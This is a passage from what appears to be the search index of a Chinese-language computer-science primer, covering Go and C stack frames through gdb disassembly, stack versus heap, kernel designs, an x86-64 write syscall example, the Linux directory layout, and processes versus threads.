<p>\u4e00\u822c\u4f1a\u628a\u6808\u9876\u7684\u5730\u5740\u653e\u5728SP\u5bc4\u5b58\u5668\uff0c\u628a\u6808\u5e95\u7684\u5730\u5740\u653e\u5728BP\u5bc4\u5b58\u5668\u3002\u7406\u8bba\u4e0a\uff0cSP\u6216\u8005BP\u4f7f\u7528\u4e00\u4e2a\u5c31\u591f\u4e86\uff0c\u6bcf\u4e2a\u8bed\u8a00\u90fd\u6709\u81ea\u5df1\u7684\u9009\u62e9\u3002Go\u65e9\u671f\u53ea\u7528SP\uff0c\u540e\u6765\u4e5f\u5f15\u5165\u4e86BP\uff0c\u56e0\u4e3a\u5f88\u591a\u7684\u8c03\u8bd5\u5668\u3001\u81ea\u52a8\u5316\u68c0\u6d4b\u5de5\u5177\u9700\u8981\u4f7f\u7528BP\u786e\u5b9a\u6808\u5e95\u7684\u4f4d\u7f6e\u3002</p> <p>\u5982\u679cSP/BP\u7528\u6765\u5b58\u5f53\u524d\u6b63\u5728\u6267\u884c\u7684B\u51fd\u6570\u7684\u6808\u5e27\uff0cB\u6267\u884c\u5b8c\u4ee5\u540e\u5982\u4f55\u77e5\u9053\u8c03\u7528\u5b83\u7684A\u51fd\u6570\u7684\u6808\u5e27\u6709\u591a\u5927\u5462\uff1f\u6240\u4ee5\u5728\u4e24\u4e2a\u6808\u5e27\u4e4b\u95f4\u8fd8\u6709\u4e00\u6bb5\u7a7a\u95f4\u7528\u6765\u5b58\u50a8A\u7684BP/SP\u3001IP\uff0cA\u5728\u8c03\u7528B\u7684\u65f6\u5019\u5c31\u628a\u81ea\u5df1\u7684BP/SP\u5199\u8fdb\u53bb\uff0c\u628a\u81ea\u5df1\u8c03\u7528\u5b8cB\u4e4b\u540e\u4e0b\u4e00\u6761\u8981\u6267\u884c\u4ec0\u4e48\u6307\u4ee4\u5199\u8fdbIP\uff0c\u8fd9\u53eb\u200b\u4fdd\u5b58\u73b0\u573a\u3002B\u6267\u884c\u5b8c\u4ee5\u540e\uff0c\u901a\u8fc7\u8fd9\u6bb5\u7a7a\u95f4\u6062\u590d\u73b0\u573a\u3002\u63a5\u7740\uff0c\u6211\u4eec\u770b\u770bC\u8bed\u8a00\u548cGo\u8bed\u8a00\u7684\u4fdd\u5b58\u73b0\u573a\u548c\u6062\u590d\u73b0\u573a\u5206\u522b\u662f\u600e\u4e48\u505a\u7684\u3002</p>"},{"location":"sicp/program/#go","title":"Go\u8bed\u8a00","text":"call.go<pre><code>func add(x, y int) int {\n    z := x + y\n    return z\n}\n\nfunc main() {\n    a, b := 0x11, 0x22\n    s := add(a, b)\n    println(s)\n}\n</code></pre> <p>\u901a\u8fc7<code>go build -gcflags \"-N -l\" call.go</code>\u63a5\u7740\u8fdb\u884cgdb\u8c03\u8bd5: <pre><code>(gdb) b 4\nBreakpoint 1 at 0x452347: file /root/.mac/gocode/call.go, line 4.\n(gdb) r\nThread 1 \"call\" hit Breakpoint 1, main.add (x=17, y=34, ~r2=0) at /root/.mac/gocode/call.go:4\n4       z := x + y\n(gdb) disass\nDump of assembler code for function main.add:\n   0x0000000000452330 &lt;+0&gt;: sub    rsp,0x10\n   0x0000000000452334 &lt;+4&gt;: mov    QWORD PTR [rsp+0x8],rbp\n   0x0000000000452339 &lt;+9&gt;: lea    rbp,[rsp+0x8]\n   0x000000000045233e &lt;+14&gt;:    mov    QWORD PTR [rsp+0x28],0x0\n=&gt; 0x0000000000452347 &lt;+23&gt;:    mov    rax,QWORD PTR [rsp+0x18]\n   0x000000000045234c &lt;+28&gt;:    add    rax,QWORD PTR [rsp+0x20]\n   0x0000000000452351 &lt;+33&gt;:    mov    QWORD PTR [rsp],rax\n   0x0000000000452355 &lt;+37&gt;:    mov    QWORD PTR [rsp+0x28],rax\n   0x000000000045235a &lt;+42&gt;:    mov    rbp,QWORD PTR [rsp+0x8]\n   0x000000000045235f &lt;+47&gt;:    add    rsp,0x10\n   0x0000000000452363 &lt;+51&gt;:    ret\nEnd of assembler dump.\n</code></pre></p> <p>\u6211\u4eec\u53ef\u4ee5\u628a\u5b83\u7684\u6808\u5e27\u53d8\u5316\u60c5\u51b5\u753b\u51fa\u6765:</p> <p></p>"},{"location":"sicp/program/#c","title":"C\u8bed\u8a00","text":"frame.c<pre><code>int __attribute__((noinline, optimize(\"-O0\"))) add(int x, int y)\n{\n    int z;\n    z = x + y;\n    return z;\n}\n\nint __attribute__((noinline)) main(int argc, char **argv)\n{\n    int x, y, a;\n    x = 0x11;\n    y = 0x22;\n    a = add(x, y);\n    printf(\"%d\\n\", a);\n}\n</code></pre> <p>\u901a\u8fc7<code>gcc -g -O0 -o frame frame.c</code>\u63a5\u7740\u8fdb\u884cgdb\u8c03\u8bd5: <pre><code>(gdb) b 5\nBreakpoint 1 at 0x654: file frame.c, line 5.\n(gdb) r\nBreakpoint 1, add (x=17, y=34) at frame.c:6\n6       z = x + y;\n(gdb) disass\nDump of assembler code for function add:\n   0x000055555555464a &lt;+0&gt;: push   rbp\n   0x000055555555464b &lt;+1&gt;: mov    rbp,rsp\n   0x000055555555464e &lt;+4&gt;: mov    DWORD PTR [rbp-0x14],edi\n   0x0000555555554651 &lt;+7&gt;: mov    DWORD PTR [rbp-0x18],esi\n=&gt; 0x0000555555554654 &lt;+10&gt;:    mov    edx,DWORD PTR [rbp-0x14]\n   0x0000555555554657 &lt;+13&gt;:    mov    eax,DWORD PTR [rbp-0x18]\n   0x000055555555465a &lt;+16&gt;:    add    eax,edx\n   0x000055555555465c &lt;+18&gt;:    mov    DWORD PTR [rbp-0x4],eax\n   0x000055555555465f &lt;+21&gt;:    mov    eax,DWORD PTR [rbp-0x4]\n   0x0000555555554662 &lt;+24&gt;:    pop    rbp\n   0x0000555555554663 &lt;+25&gt;:    ret\nEnd of assembler dump.\n</code></pre> \u540c\u6837\u53ef\u4ee5\u753b\u51fa\u56fe\u6765: </p>"},{"location":"sicp/program/#_17","title":"\u6bd4\u8f83","text":"<p>\u76f8\u540c\u70b9\u662f\u5728\u8c03\u7528CALL\u6307\u4ee4\u7684\u65f6\u5019\uff0c\u5148\u628amain\u51fd\u6570\u4e2d\u6267\u884c\u5b8cadd\u51fd\u6570\u7684\u4e0b\u4e00\u6761\u6307\u4ee4(\u5728IP\u5bc4\u5b58\u5668\u4e2d)\u5b58\u5728\u6808\u91cc\uff0c\u5728\u8c03\u7528RET\u6307\u4ee4\u7684\u65f6\u5019\uff0c\u8fd9\u6761\u6307\u4ee4\u4f1a\u88ab\u81ea\u52a8\u6062\u590d\u5165IP\u5bc4\u5b58\u5668\u3002</p> <p>\u4e0d\u540c\u70b9\u662fC\u8bed\u8a00\u901a\u8fc7<code>push</code>\u548c<code>pop</code>\u6307\u4ee4\u5165\u6808\u3001\u51fa\u6808\uff0c\u8ba9\u6808\u9876SP\u81ea\u52a8\u968f\u7740\u53d8\u5316\u3002\u800cGo\u8bed\u8a00\u91c7\u7528\u4e86<code>sub</code>\u3001<code>add</code>\u6307\u4ee4\u76f4\u63a5\u8ba1\u7b97\u6808\u9876\u5730\u5740\u3002</p> <p>\u6b64\u5916\uff0c\u5728C\u8bed\u8a00\u4e2d\uff0c\u662f\u4f18\u5148\u901a\u8fc7\u5bc4\u5b58\u5668\u4f20\u9012\u53c2\u6570\u548c\u8fd4\u56de\u503c\uff0c\u7ecf\u5e38\u4f7f\u7528SI\u3001DI\u5bc4\u5b58\u5668\u4f20\u53c2\uff0c\u4f7f\u7528AX\u5bc4\u5b58\u5668\u5b58\u50a8\u8fd4\u56de\u503c\uff0c\u56e0\u4e3aC\u662f\u6027\u80fd\u4f18\u5148\uff0c\u5bc4\u5b58\u5668\u80af\u5b9a\u662f\u6700\u5feb\u7684\u3002Go\u662f\u4f7f\u7528\u6808\u5185\u5b58\u4f20\u53c2\u548c\u8fd4\u56de\u503c\u7684\uff0c\u8fd9\u548c\u5b83\u672c\u8eabGoroutine\u7684\u8fd0\u884c\u65b9\u5f0f\u6709\u5173\u3002</p>"},{"location":"sicp/program/#_18","title":"\u6808\u548c\u5806","text":"<p>\u5806\u3001\u6808\u65e2\u662f\u4e24\u79cd\u6570\u636e\u7ed3\u6784\uff0c\u4e5f\u662f\u51fd\u6570\u6267\u884c\u5355\u4f4d\uff0c\u5728\u4e0d\u540c\u7684\u573a\u666f\u6709\u4e0d\u540c\u7684\u6982\u5ff5\u3002</p> <p>\u5bf9\u4e8e\u6808\u5185\u5b58\u6765\u8bb2\uff0c\u5b83\u662f\u6574\u5757\u7684\uff0c\u4e0d\u9700\u8981\u5783\u573e\u56de\u6536\u5668\u53c2\u4e0e\uff0c\u8bbf\u95ee\u7684\u65f6\u5019\u53ea\u9700\u8981\u6839\u636eBP\u3001SP\u6309\u76f8\u5bf9\u4f4d\u7f6e\u8fdb\u884c\u8bbf\u95ee\uff0c\u6240\u4ee5\u5b83\u7684\u6548\u7387\u662f\u975e\u5e38\u9ad8\u7684\u3002\u800c\u5806\u5185\u5b58\u662f\u548c\u5355\u4e2a\u7ebf\u7a0b\u65e0\u5173\u7684\uff0c\u662f\u5171\u4eab\u7684\uff0c\u5c31\u4f1a\u6d89\u53ca\u5230\u5f88\u590d\u6742\u7684\u5185\u5b58\u7ba1\u7406\u65b9\u5f0f\uff0c\u5206\u914d\u7684\u65f6\u5019\u8981\u627e\u5230\u5927\u5c0f\u548c\u4f4d\u7f6e\u5408\u9002\u7684\u5757\uff0c\u91ca\u653e\u7684\u65f6\u5019\u8981\u5c3d\u53ef\u80fd\u7684\u907f\u514d\u5185\u5b58\u788e\u7247\u5316\u3002\u6240\u4ee5\u8bf4\uff0c\u7f16\u8bd1\u5668\u6709\u8d23\u4efb\u5c3d\u53ef\u80fd\u628a\u6570\u636e\u5206\u914d\u5728\u6808\u4e0a\u3002\u4f46\u662f\uff0c\u6808\u4e0a\u5185\u5b58\u662f\u6309\u6808\u5e27\u6574\u5757\u91ca\u653e\u7684\uff0c\u67d0\u4e9b\u60c5\u51b5\u4e0b\u5982\u679c\u67d0\u4e2a\u53d8\u91cf\u8981\u5728\u4e0d\u540c\u7684\u6808\u5e27\u4e2d\u7ef4\u6301\uff0c\u5b83\u7684\u751f\u547d\u5468\u671f\u53d1\u751f\u4e86\u6539\u53d8\uff0c\u8fd9\u79cd\u60c5\u51b5\u8fd9\u4e2a\u53d8\u91cf\u7684\u5185\u5b58\u5c31\u8981\u5728\u5806\u4e0a\u5206\u914d\u4e86\uff0c\u8fd9\u79cd\u73b0\u8c61\u5c31\u53eb\u200b\u9003\u9038\u200b\u3002\u9003\u9038\u4e5f\u4f1a\u5e26\u6765\u4e25\u91cd\u7684\u6027\u80fd\u95ee\u9898\u3002</p>"},{"location":"sicp/software/","title":"\u8ba1\u7b97\u673a\u79d1\u5b66\u57fa\u7840\u77e5\u8bc6\u4e4b\u8f6f\u4ef6\u90e8\u5206","text":""},{"location":"sicp/software/#_2","title":"\u64cd\u4f5c\u7cfb\u7edf","text":"<p>\u64cd\u4f5c\u7cfb\u7edf\u200b\u662f\u8ba1\u7b97\u673a\u4f53\u7cfb\u7684\u5185\u6838\u548c\u57fa\u77f3\uff0c\u7ba1\u7406\u8ba1\u7b97\u673a\u786c\u4ef6\u4e0e\u8f6f\u4ef6\u8d44\u6e90\u3002\u5206\u4e3a:</p> <ul> <li>\u4e2a\u4eba\u673a: Windows, macOS, Linux/BSD</li> <li>\u5927\u578b\u673a: Linux, Unix</li> <li>\u5d4c\u5165\u5f0f: VxWorks</li> <li>\u79fb\u52a8\u7aef: Android, Windows CE</li> </ul> <p>\u56e0\u4e3aUnix\u5546\u4e1a\u7248\u6743\u7684\u539f\u56e0\uff0c\u5fc5\u987b\u5b8c\u5168\u7b26\u5408UNIX\u6807\u51c6\u624d\u80fd\u79f0\u4e3aUNIX\u7cfb\u7edf\uff0c\u5176\u4ed6\u7684BSD/Linux\u53ea\u80fd\u79f0\u4e3aUNIX-like\u3002\u5b66\u672f\u4e0a\u7684\u64cd\u4f5c\u7cfb\u7edf\u548c\u6211\u4eec\u65e5\u5e38\u53e3\u4e2d\u8bf4\u7684\u64cd\u4f5c\u7cfb\u7edf\u4e0d\u592a\u4e00\u6837\uff0c\u6211\u4eec\u4e00\u822c\u8bf4\u7684windows\u4e25\u683c\u6765\u8bf4\u5c5e\u4e8e\u4e00\u4e2a\u64cd\u4f5c\u7cfb\u7edf\u4ea7\u54c1\u6216\u8005\u8bf4\u4e00\u4e2a\u64cd\u4f5c\u7cfb\u7edf\u7684\u53d1\u884c\u7248\uff0c\u5b83\u662f\u7cfb\u7edf\u672c\u8eab\u548c\u4e00\u4e9b\u8f6f\u4ef6(\u6d4f\u89c8\u5668\u3001\u626b\u96f7)\u7684\u6253\u5305\uff0c\u800c\u5b66\u672f\u4e0a\u7684\u64cd\u4f5c\u7cfb\u7edf\u6307\u7684\u662f\u5185\u6838\u548c\u4e00\u4e9b\u5fc5\u8981\u7684\u670d\u52a1\u3002</p> <p>\u73b0\u4ee3\u64cd\u4f5c\u7cfb\u7edf\u7684\u57fa\u672c\u529f\u80fd\u5305\u62ec:</p> <ul> <li>\u5185\u5b58\u7ba1\u7406(memory management)</li> <li>\u8fdb\u7a0b\u7ba1\u7406(process management)</li> <li>\u4e2d\u65ad\u5904\u7406(interrupt handling)</li> <li>\u6587\u4ef6\u7cfb\u7edf(file system)</li> <li>\u5b89\u5168\u673a\u5236(protection and security)</li> <li>\u8fdb\u7a0b\u901a\u4fe1(inter-process communications)</li> <li>\u8bbe\u5907\u9a71\u52a8(device driver)</li> </ul>"},{"location":"sicp/software/#_3","title":"\u5185\u6838","text":"<p>\u5fae\u5185\u6838\u200b\u5c31\u662f\u628a\u6700\u6838\u5fc3\u3001\u6700\u57fa\u7840\u7684\u90e8\u5206\u5355\u72ec\u4f5c\u4e3a\u5185\u6838\uff0c\u5176\u4ed6\u529f\u80fd\u56f4\u7ed5\u5b83\u5904\u7406\u3002\u5305\u62ec\u5730\u5740\u7a7a\u95f4\u3001\u7ebf\u7a0b\u5904\u7406\u3001\u8fdb\u7a0b\u901a\u4fe1\u7b49\u3002\u8fd9\u7c7b\u4e1c\u897f\u5b83\u4eec\u9700\u8981\u4ee5\u7279\u6743\u6a21\u5f0f\u8fd0\u884c\uff0c\u5176\u4ed6\u57fa\u7840\u670d\u52a1\u5f53\u505a\u666e\u901a\u5e94\u7528\u7a0b\u5e8f\u72ec\u7acb\u8fd0\u884c\u3002</p> <p>\u5728\u5185\u6838\u4e2d\u8fd0\u884c\u7684\u7a0b\u5e8f\u4f7f\u7528\u7684\u5185\u5b58\uff0c\u53eb\u200b\u5185\u6838\u7a7a\u95f4\uff0c\u4e5f\u53eb\u5185\u6838\u6001\u3002\u5176\u4ed6\u7a0b\u5e8f\u8fd0\u884c\u5728\u200b\u7528\u6237\u7a7a\u95f4\uff0c\u4e5f\u53eb\u7528\u6237\u6001\u3002\u7528\u6237\u6001\u7684\u4ee3\u7801\u9700\u8981\u5728\u5185\u6838\u6001\u8fd0\u884c\u65f6\uff0c\u5e76\u4e0d\u662f\u76f4\u63a5\u653e\u5728\u5185\u6838\u6001\u4e2d\u8fd0\u884c\u7684\uff0c\u8fd9\u6837\u5b89\u5168\u6ca1\u6cd5\u4fdd\u8bc1\uff0c\u9996\u5148\u4f1a\u505a\u6743\u9650\u68c0\u67e5\uff0c\u901a\u8fc7\u4e4b\u540e\u76f8\u5f53\u4e8e\u63d0\u4ea4\u4e86\u7533\u8bf7\uff0c\u5185\u6838\u8fd0\u884c\u5b8c\u6210\u4ee5\u540e\u8fd4\u56de\u7ed3\u679c\u5524\u9192\u7528\u6237\u6001\u7684\u7a0b\u5e8f\uff0c\u8fd9\u5c31\u53c8\u6d89\u53ca\u5230\u4e86\u4e0a\u4e0b\u6587\u5207\u6362\u548c\u72b6\u6001\u4fdd\u5b58\u3002\u6240\u4ee5\u7528\u6237\u6001\u548c\u5185\u6838\u6001\u7684\u5207\u6362\u4f1a\u6d88\u8017\u5927\u91cf\u7684\u8d44\u6e90\u3002</p> <p>\u5fae\u5185\u6838\u7684\u4f18\u70b9\u5c31\u662f\u5185\u6838\u5f88\u5c0f\uff0c\u88c1\u526a\u8d77\u6765\u65b9\u4fbf\uff0c\u88c1\u526a\u4e0d\u540c\u7684\u57fa\u7840\u670d\u52a1\u5c31\u53ef\u4ee5\u5f62\u6210\u4e0d\u540c\u7684\u7248\u672c\u9762\u5411\u4e0d\u540c\u7684\u7528\u6237\uff0c\u53e6\u5916\u5c31\u662f\u5176\u4e2d\u67d0\u4e2a\u670d\u52a1\u5d29\u6e83\u7684\u8bdd\u4e0d\u4f1a\u5f71\u54cd\u5230\u5185\u6838\uff0c\u5185\u6838\u53ef\u4ee5\u91cd\u542f\u6539\u670d\u52a1\u3002\u5f53\u7136\u7f3a\u70b9\u5c31\u662f\u7531\u4e8e\u5904\u4e8e\u4e0d\u540c\u7684\u5730\u5740\u7a7a\u95f4\uff0c\u57fa\u7840\u670d\u52a1\u548c\u5185\u6838\u901a\u4fe1\u65f6\u5f97\u4f7f\u7528\u7c7b\u4f3c\u4e8eIPC(Inter-Process Communication)\u7684\u65b9\u5f0f\u901a\u8baf\uff0c\u6548\u7387\u76f8\u5bf9\u4f1a\u5dee\u4e00\u4e9b\u3002</p> <p>\u5fae\u5185\u6838\u7684\u5178\u578b\u4ee3\u8868\u662f\u5b66\u672f\u4e0a\u7684windows\u548cmacOS\uff0c\u800c\u4e0d\u662fLinux\uff0c\u65e9\u671f\u7684Linux\u4e3a\u4e86\u6027\u80fd\u8003\u8651\u91c7\u7528\u4e86\u5b8f\u5185\u6838\u3002</p> <p>\u5b8f\u5185\u6838\u200b\u4e5f\u53eb\u5355\u4e00\u5185\u6838\uff0c\u628a\u6838\u5fc3\u548c\u57fa\u7840\u670d\u52a1\u653e\u5728\u4e00\u4e2a\u5730\u5740\u7a7a\u95f4\u5185\u5747\u4ee5\u7279\u6743\u6a21\u5f0f\u8fd0\u884c\uff0c\u597d\u5904\u5c31\u662f\u8c03\u7528\u4e00\u4e9b\u57fa\u7840\u670d\u52a1\u7684\u65f6\u5019\u76f8\u5f53\u4e8e\u51fd\u6570\u8c03\u7528\uff0c\u4e0d\u9700\u8981\u901a\u8baf\uff0c\u6027\u80fd\u5f88\u9ad8\u3002\u7f3a\u70b9\u5c31\u662f\u590d\u6742\u5ea6\u548c\u8026\u5408\u5ea6\u5f88\u9ad8\uff0c\u867d\u7136\u4ee3\u7801\u662f\u6a21\u5757\u5316\u7684\uff0c\u4f46\u5176\u4e2d\u67d0\u4e2a\u6a21\u5757\u5d29\u6e83\u90fd\u53ef\u80fd\u5bfc\u81f4\u6574\u4e2a\u7cfb\u7edf\u5d29\u6e83\uff0c\u4e5f\u4e0d\u65b9\u4fbf\u88c1\u526a\u548c\u79fb\u690d\u3002</p> <p> \u73b0\u4ee3\u7684\u64cd\u4f5c\u7cfb\u7edf\u5f80\u5f80\u662f\u91c7\u7528\u6df7\u5408\u5185\u6838\u7684\uff0c\u5e76\u4e0d\u662f\u6cfe\u6e2d\u5206\u660e\u7684\u3002</p>"},{"location":"sicp/software/#_4","title":"\u7cfb\u7edf\u8c03\u7528","text":"<p>\u7cfb\u7edf\u8c03\u7528\u200b\u662f\u5185\u6838\u5bf9\u5916\u7684\u63a5\u53e3\uff0c\u5185\u6838\u6001\u7684\u4e00\u4e9b\u5185\u6838\u51fd\u6570\u3002\u5e94\u7528\u7a0b\u5e8f\u53ea\u8981\u548c\u786c\u4ef6\u6253\u4ea4\u9053\u90fd\u4f1a\u6d89\u53ca\u5230\u7cfb\u7edf\u8c03\u7528\uff0c\u5411\u64cd\u4f5c\u7cfb\u7edf\u7533\u8bf7\u5e76\u7b49\u5f85\u56de\u590d\uff0c\u5e94\u8be5\u5c3d\u91cf\u907f\u514d\u7cfb\u7edf\u8c03\u7528\u6216\u8003\u8651\u5176\u4ed6\u65b9\u5f0f\u4f18\u5316\uff0c\u6bd4\u5982\u6709\u4e9b\u573a\u666f\u53ef\u4ee5\u4f7f\u7528\u5728\u7528\u6237\u7a7a\u95f4\u7684\u5e26buffer\u7684\u6587\u4ef6\u66ff\u4ee3\u64cd\u4f5c\u7cfb\u7edf\u63d0\u4f9b\u7684\u6587\u4ef6\u8bfb\u5199API\u3002</p> <p>\u5178\u578b\u7684\u7cfb\u7edf\u8c03\u7528\u6c47\u7f16\u4ee3\u7801: <pre><code>global _start \n\nsection .data\n    hello : db `hello, world!\\n`\nsection .text \n    _start:\n        mov rax, 1      ; system call number should be store in rax\n        mov rdi, 1      ; argument #1 in rdi: where to write (descriptor)?\n        mov rsi, hello  ; argument #2 in rsi: where does the string start?\n        mov rdx, 14     ; argument #3 in rdx: how many bytes to write?\n        syscall         ; this instruction invokes a system call\n\n        mov rax, 60     ; 'exit' syscall number\n        xor rdi, rdi\n        syscall\n</code></pre> C\u8bed\u8a00\u3001Go\u8bed\u8a00\u901a\u8fc7\u6807\u51c6\u5e93\u8fdb\u884c\u7cfb\u7edf\u8c03\u7528\uff0c\u4ed6\u4eec\u7684\u6807\u51c6\u5e93\u4e2d\u7684\u51fd\u6570\u4e5f\u53ea\u662f\u5728\u6c47\u7f16\u4e4b\u4e0a\u7684\u4e00\u79cd\u5305\u88c5\u3002\u5728\u6c47\u7f16\u8bed\u8a00\u4e2d\u901a\u8fc7\u5728\u4e0d\u540c\u5bc4\u5b58\u5668\u4e2d\u653e\u4e0d\u540c\u7684\u53c2\u6570\uff0c\u518d\u6267\u884c<code>syscall</code>\u8fd9\u6761\u6307\u4ee4\u5c31\u53ef\u4ee5\u8fdb\u884c\u7cfb\u7edf\u8c03\u7528\u3002<code>syscall</code>\u662f64\u4f4d\u64cd\u4f5c\u7cfb\u7edf\u6539\u8fdb\u7684\u4e00\u6761\u6307\u4ee4\uff0cx86\u4e0b\u662f<code>int 0x80</code>\uff0c\u8fd9\u79cd\u6539\u8fdb\u6548\u7387\u4e0a\u4e5f\u66f4\u9ad8\u4e00\u4e9b\u3002</p> <p>RAX\u5bc4\u5b58\u5668\u5b58\u653e\u4e0d\u540c\u7cfb\u7edf\u8c03\u7528\u7684\u5e8f\u53f7\uff0c\u76f8\u5f53\u4e8e\u51fd\u6570\u540d\u79f0\uff1bRDI\u3001RSI\u3001RDX\u3001R10\u3001R8\u3001R9\u4f9d\u6b21\u5b58\u653e\u53c2\u6570\uff1b\u518d\u7528RAX\u5b58\u8fd4\u56de\u503c\u3002\u8fd9\u662f\u7cfb\u7edf\u8c03\u7528\u7684\u8c03\u7528\u7ea6\u5b9a\u3002\u53ef\u4ee5\u901a\u8fc7\u8fd9\u91cc\u67e5\u770b\u5230\u7cfb\u7edf\u8c03\u7528\u51fd\u6570\u6709\u54ea\u4e9b\uff0c\u5206\u522b\u662f\u5982\u4f55\u4f20\u53c2\u7684\u3002</p>"},{"location":"sicp/software/#_5","title":"\u6587\u4ef6\u7cfb\u7edf","text":"<p>\u5927\u591a\u6570Linux\u53d1\u884c\u7248\u7684\u6587\u4ef6\u7cfb\u7edf\u90fd\u6709\u7740\u975e\u5e38\u7c7b\u4f3c\u7684\u7ed3\u6784\uff0c\u9664\u4e86<code>ls</code>\uff0c<code>tree</code>\u4e5f\u662f\u4e00\u4e2a\u5f88\u597d\u7684\u89c2\u5bdf\u5176\u7ed3\u6784\u7684\u5de5\u5177\u3002\u5e38\u7528\u7684\u76ee\u5f55\u53ca\u5176\u7528\u9014:</p> <ul> <li>/bin\uff0c\u5305\u542b\u57fa\u672c\u7684\u7cfb\u7edf\u7ea7\u4e8c\u8fdb\u5236\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u4f8b\u5982<code>ls</code></li> <li>/sbin\uff0c\u5305\u542b\u9700\u8981root\u6743\u9650\u624d\u80fd\u6267\u884c\u7684\u53ef\u6267\u884c\u6587\u4ef6</li> <li>/usr\uff0c\u53ea\u8bfb\u7684\u7528\u6237\u6570\u636e<ul> <li>/usr/bin\uff0c\u975e\u5fc5\u987b\u7684\u6216\u8005\u662f\u7528\u6237\u81ea\u5df1\u5b89\u88c5\u7684\u53ef\u6267\u884c\u6587\u4ef6</li> <li>/usr/sbin\uff0c\u975e\u5fc5\u987b\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u4f46\u9700root\u6267\u884c</li> <li>/usr/local/bin\uff0c\u7528\u6237\u81ea\u884c\u7f16\u8bd1\u540e\u7684\u6587\u4ef6</li> </ul> </li> <li>/home\uff0c\u7528\u6237\u7684\u4e2a\u4eba\u76ee\u5f55</li> <li>/root\uff0croot\u7528\u6237\u7684\u76ee\u5f55\uff0croot\u662f\u7279\u6b8a\u7528\u6237\u6240\u4ee5\u4e0d\u4f1a\u653e\u5728/home\u4e2d</li> <li>/dev\uff0c\u8bbe\u5907\u6587\u4ef6\uff0c\u901a\u5e38\u662f\u786c\u4ef6\u8bbe\u5907\u7684\u63a5\u53e3\u6587\u4ef6</li> <li>/etc\uff0c\u5305\u542b\u4e86\u5927\u90e8\u5206\u7684\u7cfb\u7edf\u914d\u7f6e\u6587\u4ef6\uff0c\u4f8b\u5982\u7cfb\u7edf\u540d\u79f0\u3001\u786c\u76d8\u4e0a\u7684\u5b89\u88c5\u4f4d\u7f6e\u7b49</li> <li>/lib\uff0c\u5e93\u6587\u4ef6\u4ee5\u53ca\u663e\u5361\u3001\u58f0\u5361\u7b49\u786c\u4ef6\u5de5\u4f5c\u7684\u9a71\u52a8\u6587\u4ef6</li> <li>/opt\uff0c\u7528\u6237\u5b89\u88c5\u4e00\u4e9b\u5927\u578b\u7a0b\u5e8f\uff0c\u6216\u8005\u662f\u4e00\u4e9b\u670d\u52a1\u7a0b\u5e8f\u7684\u5b89\u88c5\u76ee\u5f55</li> <li>/sys\uff0c\u5305\u542b\u7cfb\u7edf\u7684\u4fe1\u606f\uff0c\u548c\u8fde\u63a5\u5230\u8ba1\u7b97\u673a\u7684\u8bbe\u5907\u7684\u4fe1\u606f</li> <li>/var\uff0c\u6700\u521d\u8fd9\u6837\u547d\u540d\u662f\u56e0\u4e3a\u5b83\u7ecf\u5e38\u53d8\u5316\uff0c\u5b58\u50a8\u65e5\u5fd7\u7b49\u5185\u5bb9</li> <li>/tmp\uff0c\u4e34\u65f6\u6587\u4ef6\uff0c\u91cd\u542f\u7cfb\u7edf\u540e\u91cc\u9762\u7684\u6587\u4ef6\u90fd\u4f1a\u88ab\u5220\u9664</li> </ul> <p>\u66f4\u591a\u7684\u76ee\u5f55\u7ed3\u6784\u53ca\u7528\u9014\u89c1wiki\u3002</p>"},{"location":"sicp/software/#_6","title":"\u8fdb\u7a0b\u548c\u7ebf\u7a0b","text":""},{"location":"sicp/software/#_7","title":"\u7a0b\u5e8f\u4e0e\u8fdb\u7a0b","text":"<p>\u7a0b\u5e8f\u548c\u8fdb\u7a0b\u6709\u4ec0\u4e48\u533a\u522b\uff1f</p> <p>\u67d0\u4e2a\u7a0b\u5e8f\u91cc\u5305\u542b\u4e86\u67d0\u4e2a\u8fdb\u7a0b\u6240\u9700\u8981\u7684\u6570\u636e\uff0c\u4f46\u5728\u67d0\u4e2a\u65f6\u95f4\u70b9\uff0c\u8fdb\u7a0b\u4e2d\u7684\u5185\u5bb9\u672a\u5fc5\u548c\u7a0b\u5e8f\u4e2d\u7684\u5185\u5bb9\u662f\u4e00\u4e00\u5bf9\u5e94\u7684\u3002\u6211\u4eec\u5f00\u53d1\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u4e0d\u4ec5\u5305\u62ec\u53ef\u6267\u884c\u7684\u4ee3\u7801\uff0c\u8fd8\u6709\u5468\u8fb9\u7684\u7d20\u6750\u7b49\u7b49\uff0c\u7a0b\u5e8f\u8fd0\u884c\u7684\u65f6\u5019\uff0c\u4e5f\u672a\u5fc5\u4f1a\u628a\u5168\u90e8\u5185\u5bb9\u90fd\u8f7d\u5165\u5230\u5185\u5b58\u3002\u800c\u200b\u8fdb\u7a0b\u200b\u6307\u7684\u662f\u7a0b\u5e8f\u8fd0\u884c\u65f6\uff0c\u5728\u5185\u5b58\u5f53\u4e2d\u53d7\u64cd\u4f5c\u7cfb\u7edf\u7ba1\u7406\u7684\u90e8\u5206\u3002\u7a0b\u5e8f\u200b\u5c31\u50cf\u662f\u84dd\u56fe\uff0c\u6211\u4eec\u53ef\u4ee5\u662f\u7167\u7740\u540c\u4e00\u4efd\u84dd\u56fe\u542f\u52a8\u591a\u4e2a\u8fdb\u7a0b\u3002</p> <p>\u8fdb\u7a0b\u4e0d\u662f\u6267\u884c\u5355\u4f4d\uff0c\u800c\u662f\u4e00\u4e2a\u8d44\u6e90\u8fb9\u754c\u3002\u76f8\u5f53\u4e8e\u5728\u5185\u5b58\u8fd9\u4e2a\u4e16\u754c\u91cc\u9762\uff0c\u8fdb\u7a0b\u5708\u4e86\u4e00\u5757\u5730\uff0c\u8fd9\u5757\u5730\u6709\u5f88\u591a\u7684\u5c5e\u6027\uff0c\u6bd4\u5982\u865a\u62df\u5730\u5740\u7a7a\u95f4\u3001PID\u7b49\uff0c\u800c\u5730\u4e0a\u7684\u5de5\u4eba\u3001\u6d41\u6c34\u7ebf\u624d\u662f\u6267\u884c\u5355\u4f4d\uff0c\u6211\u4eec\u79f0\u4e3a\u200b\u7ebf\u7a0b\u3002\u6240\u4ee5\u6bcf\u4e2a\u8fdb\u7a0b\u90fd\u6709\u4e00\u4e2a\u4e3b\u7ebf\u7a0b\u3002</p> <ul> <li>\u8fdb\u7a0b\u662f\u7a0b\u5e8f\u7684\u8fd0\u884c\u671f\u5b9e\u4f8b(\u4f46\u4e0d\u540c\u64cd\u4f5c\u7cfb\u7edf\u5bf9\u8fdb\u7a0b\u5b9a\u4e49\u53ef\u80fd\u4e0d\u540c)</li> 